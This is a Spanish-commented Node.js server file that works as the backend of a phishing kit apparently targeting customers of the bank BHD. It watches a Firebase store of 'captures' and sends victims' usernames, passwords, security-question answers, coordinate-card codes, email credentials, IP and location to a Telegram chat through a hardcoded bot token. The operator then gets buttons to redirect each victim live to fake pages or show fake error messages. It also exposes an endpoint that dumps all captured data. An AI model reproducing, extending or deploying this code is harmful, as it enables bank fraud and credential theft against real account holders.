// server.js - VERSIÓN COMPLETA CON SOPORTE CORS Y ALERTA FUNCIONAL
const express = require('express');
const admin = require('firebase-admin');
const axios = require('axios');

// Configurar dotenv solo en desarrollo
if (process.env.NODE_ENV !== 'production') {
  require('dotenv').config();
}

const app = express();

// === ✅ MIDDLEWARE CORS (ES CLAVE PARA QUE FUNCIONE DESDE CUALQUIER DOMINIO) ===
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  next();
});

// Parsear JSON con límite alto
app.use(express.json({ limit: '10mb' }));

// === CONFIGURACIÓN DE TELEGRAM ===
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8302617462:AAGikIPtSly1eLtqJdEOQ8w2AoCGEj9gGKY';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1002991672575';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`; // ✅ SIN ESPACIOS
const SERVER_URL = process.env.RENDER_URL || 'https://bhs-8syw.onrender.com'; // ✅ SIN ESPACIOS
const ALLOWED_PAGES = [
  'index.html',
  'pregunta-1.html',
  'coordenada1.html',
  'coordenada2.html',
  'coordenada3.html',
  'coordenadaR.html',
  'mailbox.html',
  'finalizado.html',
  'error.html',
  'bloqueo.html'
];

// === ALERTA DE ACCESO A INDEX.HTML CON CIUDAD, PAÍS Y ESTADO ===
app.post('/alert-login', async (req, res) => {
  let data = req.body;
  // Parseo manual en caso de que el body llegue vacío
  if (!data || Object.keys(data).length === 0) {
    try {
      const rawBody = await new Promise((resolve, reject) => {
        let body = '';
        req.on('data', chunk => body += chunk.toString());
        req.on('end', () => resolve(body));
        req.on('error', reject);
      });
      data = JSON.parse(rawBody);
    } catch (e) {
      console.error('❌ Error parseando cuerpo de /alert-login:', e.message);
      return res.status(400).json({ success: false, error: 'Invalid JSON' });
    }
  }

  const { ip, referrer, userAgent, timestamp, city, country, region } = data;
  
  const message = `🚨 *ACCESO A BHD*\n` +
                  `🔹 *IP*: \`${ip || 'N/A'}\`\n` +
                  `🔹 *Ubicación*: ${city || 'N/A'}, ${region || 'N/A'}, ${country || 'N/A'}\n` +
                  `🔹 *Referrer*: ${referrer || 'Directo'}\n` +
                  `🔹 *UserAgent*: ${userAgent?.substring(0, 80) || 'N/A'}...\n` +
                  `🔹 *Fecha*: ${new Date(timestamp).toLocaleString()}\n` +
                  `🔹 *Origen*: Frontend - index.html`;

  try {
    const sent = await sendToTelegram(message);
    if (sent) {
      console.log('✅ Alerta de acceso enviada a Telegram');
      return res.status(200).json({ success: true });
    } else {
      console.error('❌ Falló el envío de alerta a Telegram');
      return res.status(500).json({ success: false });
    }
  } catch (error) {
    console.error('❌ Excepción en /alert-login:', error.message);
    return res.status(500).json({ success: false });
  }
});

// === CONFIGURACIÓN DE FIREBASE ===
console.log('🔧 Inicializando Firebase Admin...');

let serviceAccount;
try {
  if (process.env.FIREBASE_SERVICE_ACCOUNT) {
    serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
    console.log('✅ Firebase config cargada desde variables de entorno');
  } else {
    serviceAccount = require('./serviceAccountKey.json');
    console.log('✅ Firebase config cargada desde archivo local');
  }
} catch (error) {
  console.error('❌ ERROR: No se pudo cargar la configuración de Firebase');
  console.error('Detalles:', error.message);
  process.exit(1);
}

// Inicializar Firebase Admin SDK
try {
  admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: 'https://bhd-firebase-default-rtdb.firebaseio.com' // ✅ SIN ESPACIOS
  });
  console.log('✅ Firebase Admin SDK inicializado correctamente');
} catch (error) {
  console.error('❌ ERROR al inicializar Firebase:', error.message);
  process.exit(1);
}

const database = admin.database();

// === FUNCIONES DE UTILIDAD ===
async function testFirebaseConnection() {
  try {
    console.log('🔍 Probando conexión a Firebase...');
    const testRef = database.ref('test_connection');
    await testRef.set({ timestamp: Date.now() });
    await testRef.remove();
    console.log('✅ Conexión a Firebase establecida correctamente');
    return true;
  } catch (error) {
    console.error('❌ ERROR: No se pudo conectar a Firebase');
    console.error('🔴 Detalles:', error.message);
    return false;
  }
}

async function testTelegramConnection() {
  try {
    console.log('🔍 Probando conexión a Telegram...');
    const response = await axios.get(`${TELEGRAM_API}/getMe`, { timeout: 10000 });
    console.log('✅ Conexión a Telegram establecida - Bot:', response.data.result.username);
    return true;
  } catch (error) {
    console.error('❌ ERROR: No se pudo conectar a Telegram');
    console.error('🔴 Mensaje:', error.message);
    if (error.response) {
      console.error('🔴 Status:', error.response.status);
      console.error('🔴 Data:', error.response.data);
    }
    return false;
  }
}

function createActionButtons(uid, step) {
  const buttons = [];
  
  // Botones de redirección principales
  buttons.push([
    { text: '🏠 INDEX', callback_data: `redirect_${uid}_index.html` },
    { text: '❓ PREGUNTA 1', callback_data: `redirect_${uid}_pregunta-1.html` }
  ]);
  
  buttons.push([
    { text: '📍 COORD 1', callback_data: `redirect_${uid}_coordenada1.html` },
    { text: '📍 COORD 2', callback_data: `redirect_${uid}_coordenada2.html` }
  ]);
  
  buttons.push([
    { text: '📍 COORD 3', callback_data: `redirect_${uid}_coordenada3.html` },
    { text: '🔄 COORD R', callback_data: `redirect_${uid}_coordenadaR.html` }
  ]);
  
  buttons.push([
    { text: '📧 MAILBOX', callback_data: `redirect_${uid}_mailbox.html` },
    { text: '✅ FINAL', callback_data: `redirect_${uid}_finalizado.html` }
  ]);

  // Botones de error específicos según el paso
  if (step === 'login') {
    buttons.push([
      { text: '❌ ERROR USUARIO', callback_data: `error_${uid}_usuario` },
      { text: '❌ ERROR CONTRASEÑA', callback_data: `error_${uid}_contrasena` }
    ]);
  } else if (step === 'security') {
    buttons.push([
      { text: '❌ ERROR RESPUESTAS', callback_data: `error_${uid}_respuestas` }
    ]);
  } else if (step.startsWith('coordenada')) {
    buttons.push([
      { text: '❌ ERROR COORDENADAS', callback_data: `error_${uid}_coordenadas` }
    ]);
  } else if (step === 'mailbox') {
    buttons.push([
      { text: '❌ ERROR CORREO', callback_data: `error_${uid}_correo` },
      { text: '❌ ERROR PASS CORREO', callback_data: `error_${uid}_pass_correo` }
    ]);
  }

  // Botones generales de error
  buttons.push([
    { text: '🚫 BLOQUEO', callback_data: `redirect_${uid}_bloqueo.html` },
    { text: '❌ ERROR GEN', callback_data: `redirect_${uid}_error.html` }
  ]);
  
  return {
    inline_keyboard: buttons
  };
}

async function sendToTelegram(message, replyMarkup = null) {
  try {
    console.log('📨 Intentando enviar mensaje a Telegram...');
    
    const payload = {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    };

    if (replyMarkup) {
      payload.reply_markup = replyMarkup;
    }

    const response = await axios.post(`${TELEGRAM_API}/sendMessage`, payload, {
      timeout: 15000,
      headers: {
        'Content-Type': 'application/json'
      }
    });

    console.log(`✅ Mensaje enviado a Telegram - ID: ${response.data.result.message_id}`);
    return true;
  } catch (error) {
    console.error('❌ ERROR AL ENVIAR A TELEGRAM:');
    console.error('🔴 Mensaje:', error.message);
    
    if (error.response) {
      console.error('🔴 Status:', error.response.status);
      console.error('🔴 Data:', JSON.stringify(error.response.data, null, 2));
    }
    
    return false;
  }
}

// === LISTENER DE FIREBASE ===
let isProcessing = false;

console.log('👂 Configurando listener de Firebase...');

database.ref('/captures').on('child_added', async (snapshot) => {
  console.log('🔔 EVENTO child_added DETECTADO');
  
  if (isProcessing) {
    console.log('⏳ Ya hay un proceso en ejecución, ignorando...');
    return;
  }
  isProcessing = true;

  try {
    const uid = snapshot.key;
    const data = snapshot.val();

    console.log(`📥 Nueva captura detectada - UID: ${uid}`);

    // Evitar procesar el campo redirectPage y errorMessage
    const steps = Object.keys(data).filter(key => key !== 'redirectPage' && key !== 'errorMessage');
    
    if (steps.length === 0) {
      console.log('⚠️ No hay pasos para procesar');
      isProcessing = false;
      return;
    }

    const step = steps[0];
    const payload = data[step];

    // Construir mensaje para Telegram
    let mensaje = `🚨 *NUEVO DATO CAPTURADO - BHD*\n`;
    mensaje += `🔹 *UID*: \`${uid}\`\n`;
    mensaje += `🔹 *Paso*: ${step}\n\n`;

    if (step === 'login') {
      mensaje += `🔐 *CREDENCIALES*\n`;
      mensaje += `• Usuario: \`${payload.username || 'N/A'}\`\n`;
      mensaje += `• Contraseña: \`${payload.password || 'N/A'}\`\n\n`;
    } else if (step === 'security') {
      mensaje += `❓ *PREGUNTAS DE SEGURIDAD*\n`;
      mensaje += `• Color favorito: \`${payload.ans1 || 'N/A'}\`\n`;
      mensaje += `• Marca primer carro: \`${payload.ans2 || 'N/A'}\`\n`;
      mensaje += `• Personaje libro: \`${payload.ans3 || 'N/A'}\`\n`;
      mensaje += `• Abuela materna: \`${payload.ans4 || 'N/A'}\`\n`;
      mensaje += `• Colegio primaria: \`${payload.ans5 || 'N/A'}\`\n\n`;
    } else if (step.startsWith('coordenada')) {
      mensaje += `📍 *COORDENADAS (${step})*\n`;
      Object.keys(payload).forEach(key => {
        if (key.startsWith('coord')) {
          mensaje += `• ${key}: \`${payload[key] || 'N/A'}\`\n`;
        }
      });
      mensaje += `\n`;
    } else if (step === 'mailbox') {
      mensaje += `📧 *CORREO*\n`;
      mensaje += `• Email: \`${payload.email || 'N/A'}\`\n`;
      mensaje += `• Contraseña: \`${payload.emailPassword || 'N/A'}\`\n\n`;
    } else if (step === 'finalizado') {
      mensaje += `✅ *PROCESO COMPLETADO*\n`;
      mensaje += `• Estado: Finalizado correctamente\n`;
      mensaje += `• Completado: ${payload.completedAt || 'N/A'}\n\n`;
    } else if (step === 'error') {
      mensaje += `❌ *ERROR DETECTADO*\n`;
      mensaje += `• Tipo: ${payload.errorType || 'N/A'}\n`;
      if (payload.errorDetails && Array.isArray(payload.errorDetails)) {
        payload.errorDetails.forEach((error, index) => {
          mensaje += `• Error ${index + 1}: ${error}\n`;
        });
      }
      mensaje += `\n`;
    } else if (step === 'bloqueo') {
      mensaje += `🚫 *BLOQUEO DE SEGURIDAD*\n`;
      mensaje += `• Razón: ${payload.blockReason || 'N/A'}\n`;
      mensaje += `• Duración: ${payload.blockDuration || 'N/A'}\n`;
      if (payload.securityMeasures && Array.isArray(payload.securityMeasures)) {
        payload.securityMeasures.forEach((measure, index) => {
          mensaje += `• Medida ${index + 1}: ${measure}\n`;
        });
      }
      mensaje += `\n`;
    } else {
      mensaje += `📝 *DATOS*\n`;
      Object.keys(payload).forEach(key => {
        if (key !== 'timestamp' && key !== 'originalUid') {
          mensaje += `• ${key}: \`${payload[key] || 'N/A'}\`\n`;
        }
      });
      mensaje += `\n`;
    }

    // Información del sistema
    mensaje += `🌐 *INFO DEL USUARIO*\n`;
    mensaje += `• IP: \`${payload.ip || 'N/A'}\`\n`;
    mensaje += `• Ubicación: ${payload.city || 'N/A'}, ${payload.region || 'N/A'}, ${payload.country || 'N/A'}\n`;
    mensaje += `• Navegador: ${payload.userAgent?.substring(0, 50) || 'N/A'}...\n`;
    mensaje += `• Fecha: ${payload.date || 'N/A'} - ${payload.time || 'N/A'}\n`;
    mensaje += `• Resolución: ${payload.screenResolution || 'N/A'}\n\n`;

    // === BOTONES DE ACCIÓN (REDIRECCIÓN + ERRORES) ===
    mensaje += `⏭️ *SELECCIONA UNA ACCIÓN:*\n`;

    // Crear teclado inline con botones específicos para el paso
    const replyMarkup = createActionButtons(uid, step);

    // Enviar a Telegram con botones
    const telegramSuccess = await sendToTelegram(mensaje, replyMarkup);

    if (telegramSuccess) {
      console.log(`✅ ENVIADO A TELEGRAM: ${uid}/${step}`);
    } else {
      console.log(`❌ FALLÓ EL ENVÍO A TELEGRAM: ${uid}/${step}`);
    }

  } catch (error) {
    console.error('❌ ERROR EN LISTENER DE FIREBASE:');
    console.error('🔴 Mensaje:', error.message);
  } finally {
    isProcessing = false;
    console.log('🔄 Listener listo para siguiente evento\n');
  }
});

// === WEBHOOK DE TELEGRAM ===
app.post('/telegram/webhook', express.json(), async (req, res) => {
  console.log('🔔 Webhook de Telegram recibido');
  
  try {
    // Responder inmediatamente a Telegram
    res.status(200).send('OK');

    // Manejar callback queries (botones)
    if (req.body.callback_query) {
      const callbackData = req.body.callback_query.data;
      const chatId = req.body.callback_query.message.chat.id;
      const userId = req.body.callback_query.from.id;
      const callbackId = req.body.callback_query.id;

      console.log(`🔘 Callback recibido: ${callbackData}`);

      // Manejar redirecciones
      if (callbackData.startsWith('redirect_')) {
        const parts = callbackData.split('_');
        
        if (parts.length >= 3) {
          const uid = parts[1];
          const page = parts.slice(2).join('_');

          console.log(`🎯 Procesando redirección: ${uid} -> ${page}`);

          // Validar página permitida
          if (!ALLOWED_PAGES.includes(page)) {
            await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
              callback_query_id: callbackId,
              text: `❌ Página no permitida: ${page}`
            });
            return;
          }

          // Actualizar Firebase para redirigir al usuario
          await database.ref(`/captures/${uid}/redirectPage`).set(page);
          console.log(`✅ Firebase actualizado: ${uid} -> ${page}`);

          await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: callbackId,
            text: `✅ Redirigiendo a: ${page}`,
            show_alert: false
          });

          await sendToTelegram(
            `🔄 *REDIRECCIÓN EJECUTADA*\n\n🔹 *UID*: \`${uid}\`\n🔹 *Destino*: ${page}\n🔹 *Admin*: ${userId}\n🔹 *Hora*: ${new Date().toLocaleString()}`
          );

          console.log(`✅ Redirección completada: ${uid} → ${page}`);
        }
      }
      
      // Manejar errores específicos
      else if (callbackData.startsWith('error_')) {
        const parts = callbackData.split('_');
        
        if (parts.length >= 3) {
          const uid = parts[1];
          const errorType = parts[2];
          
          let errorMessage = '';
          
          // Definir mensajes de error según el tipo
          switch (errorType) {
            case 'usuario':
              errorMessage = 'Error de usuario - Credenciales inválidas';
              break;
            case 'contrasena':
              errorMessage = 'Error de contraseña - Clave incorrecta';
              break;
            case 'respuestas':
              errorMessage = 'Error respuestas incorrectas - Datos de seguridad no coinciden';
              break;
            case 'coordenadas':
              errorMessage = 'Error de coordenadas - Códigos incorrectos';
              break;
            case 'correo':
              errorMessage = 'Error de correo - Dirección de email inválida';
              break;
            case 'pass_correo':
              errorMessage = 'Error de contraseña de correo - Clave incorrecta';
              break;
            default:
              errorMessage = 'Error de verificación - Datos incorrectos';
          }

          console.log(`❌ Enviando error: ${uid} -> ${errorMessage}`);

          // Actualizar Firebase con el mensaje de error
          await database.ref(`/captures/${uid}/errorMessage`).set({
            message: errorMessage,
            timestamp: Date.now(),
            sentBy: userId
          });

          await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: callbackId,
            text: `✅ Error enviado: ${errorMessage}`,
            show_alert: false
          });

          await sendToTelegram(
            `❌ *ERROR ENVIADO*\n\n🔹 *UID*: \`${uid}\`\n🔹 *Error*: ${errorMessage}\n🔹 *Admin*: ${userId}\n🔹 *Hora*: ${new Date().toLocaleString()}`
          );

          console.log(`✅ Error enviado: ${uid} → ${errorMessage}`);
        }
      }
    }

  } catch (error) {
    console.error('❌ Error en webhook:', error.message);
  }
});

// === RUTAS DE DIAGNÓSTICO ===

// Ruta para testear Telegram manualmente
app.get('/test-telegram', async (req, res) => {
  try {
    console.log('🧪 Test manual de Telegram...');
    
    const testMessage = `🧪 *TEST MANUAL DEL SERVIDOR*\n\n` +
                       `• Servidor: ${SERVER_URL}\n` +
                       `• Hora: ${new Date().toLocaleString()}\n` +
                       `• Status: ✅ ACTIVO\n\n` +
                       `Este es un mensaje de prueba. Si lo ves, el servidor puede enviar a Telegram correctamente.`;

    const success = await sendToTelegram(testMessage);
    
    if (success) {
      res.json({
        success: true,
        message: 'Mensaje de prueba enviado a Telegram correctamente',
        timestamp: new Date().toISOString()
      });
    } else {
      res.status(500).json({
        success: false,
        message: 'Error al enviar mensaje de prueba a Telegram'
      });
    }

  } catch (error) {
    console.error('❌ Error en test manual:', error.message);
    res.status(500).json({
      success: false,
      error: error.message,
      details: error.response?.data
    });
  }
});

// Ruta para ver datos de Firebase
app.get('/api/captures', async (req, res) => {
  try {
    const snapshot = await database.ref('/captures').once('value');
    const data = snapshot.val();
    
    res.json({
      success: true,
      total: data ? Object.keys(data).length : 0,
      captures: data
    });
  } catch (error) {
    console.error('❌ Error consultando Firebase:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Configurar webhook de Telegram
app.get('/setup-webhook', async (req, res) => {
  try {
    const webhookUrl = `${SERVER_URL}/telegram/webhook`;
    console.log(`🔗 Configurando webhook: ${webhookUrl}`);
    
    const response = await axios.post(`${TELEGRAM_API}/setWebhook`, {
      url: webhookUrl,
      drop_pending_updates: true,
      max_connections: 40
    });
    
    res.json({
      success: true,
      webhook_url: webhookUrl,
      response: response.data
    });
    
  } catch (error) {
    console.error('❌ Error configurando webhook:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Verificar estado del webhook
app.get('/webhook-info', async (req, res) => {
  try {
    const response = await axios.get(`${TELEGRAM_API}/getWebhookInfo`);
    
    res.json({
      success: true,
      webhook_info: response.data
    });
    
  } catch (error) {
    console.error('❌ Error obteniendo info del webhook:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Health check
app.get('/health', async (req, res) => {
  const firebaseStatus = await testFirebaseConnection();
  const telegramStatus = await testTelegramConnection();
  
  res.json({
    status: 'OK',
    timestamp: new Date().toISOString(),
    service: 'BHD Firebase Server',
    environment: process.env.NODE_ENV || 'development',
    connections: {
      firebase: firebaseStatus ? '✅ CONNECTED' : '❌ DISCONNECTED',
      telegram: telegramStatus ? '✅ CONNECTED' : '❌ DISCONNECTED'
    }
  });
});

// Ruta principal
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>BHD Server</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; }
            .status { padding: 10px; border-radius: 5px; margin: 10px 0; }
            .success { background: #d4edda; color: #155724; }
            .info { background: #d1ecf1; color: #0c5460; }
            .endpoints { background: #f8f9fa; padding: 15px; border-radius: 5px; }
            a { color: #007bff; text-decoration: none; }
            a:hover { text-decoration: underline; }
        </style>
    </head>
    <body>
        <h1>🚀 Servidor BHD Firebase + Telegram</h1>
        <div class="status success">✅ Servidor activo - MENSAJES PRESERVADOS</div>
        
        <div class="endpoints">
            <strong>🔧 Endpoints:</strong><br>
            • <a href="/health">/health</a> - Estado del servidor<br>
            • <a href="/test-telegram">/test-telegram</a> - Probar Telegram<br>
            • <a href="/setup-webhook">/setup-webhook</a> - Configurar webhook<br>
            • <a href="/webhook-info">/webhook-info</a> - Ver webhook<br>
            • <a href="/api/captures">/api/captures</a> - Ver datos Firebase
        </div>
    </body>
    </html>
  `);
});

// === INICIALIZACIÓN DEL SERVIDOR ===
const PORT = process.env.PORT || 3000;

async function initializeServer() {
  console.log('🚀 Iniciando servidor BHD...');
  
  // Verificar conexiones
  const firebaseOk = await testFirebaseConnection();
  const telegramOk = await testTelegramConnection();
  
  if (!firebaseOk || !telegramOk) {
    console.error('❌ No se pueden establecer todas las conexiones necesarias');
    process.exit(1);
  }
  
  app.listen(PORT, () => {
    console.log(`✅ Servidor BHD corriendo en puerto ${PORT}`);
    console.log(`🌐 URL: ${SERVER_URL}`);
    console.log(`🔗 Health: ${SERVER_URL}/health`);
    console.log(`🧪 Test Telegram: ${SERVER_URL}/test-telegram`);
    console.log(`👂 Listener Firebase: ACTIVO`);
    console.log(`🤖 Telegram Bot: CONFIGURADO CON BOTONES DE ERROR`);
    console.log(`💾 MODO: Mensajes con errores específicos`);
  });
}

initializeServer().catch(error => {
  console.error('❌ Error fatal iniciando servidor:', error);
  process.exit(1);
});
